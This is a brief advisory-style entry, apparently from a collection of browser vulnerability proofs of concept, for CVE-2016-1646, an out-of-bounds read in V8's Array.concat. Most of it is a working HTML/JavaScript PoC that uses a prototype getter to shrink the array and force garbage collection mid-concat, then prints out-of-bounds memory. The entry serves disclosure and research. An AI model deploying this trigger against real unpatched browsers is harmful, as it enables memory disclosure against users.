# CVE-2016-1646
* Date : Mar 2016
* Credit : Wen Xu

## Description
OOB access in `Array.concat` builtin

## PoC
```html
<html>
<script language="javascript">
function gc() {
  tmp = [];
  for (var i = 0; i < 0x100000; i++)
    tmp.push(new Uint8Array(10));
  tmp = null;
}

b = new Array(10);
b[0] = 0.1; <-- Note that b[1] is a hole!
b[2] = 2.1;
b[3] = 3.1;
b[4] = 4.1;
b[5] = 5.1;
b[6] = 6.1;
b[7] = 7.1;
b[8] = 8.1;
b[9] = 9.1;
b[10] = 10.1;

Object.defineProperty(b.__proto__, 1, { <-- define b.__proto__[1] to gain the control in the middle of the loop
	get: function () {
		b.length = 1; <-- shorten the array
		gc(); <-- shrink the memory
		return 1;
	},
	set: function(new_value){
        /* some business logic goes here */
        value = new_value
    }
});

c = b.concat();
for (var i = 0; i < c.length; i++)
{
    document.write(c[i]);
    document.write("<br>");
}
</script>
</html>
```

## Reference
[issue 594574](https://bugs.chromium.org/p/chromium/issues/detail?id=594574)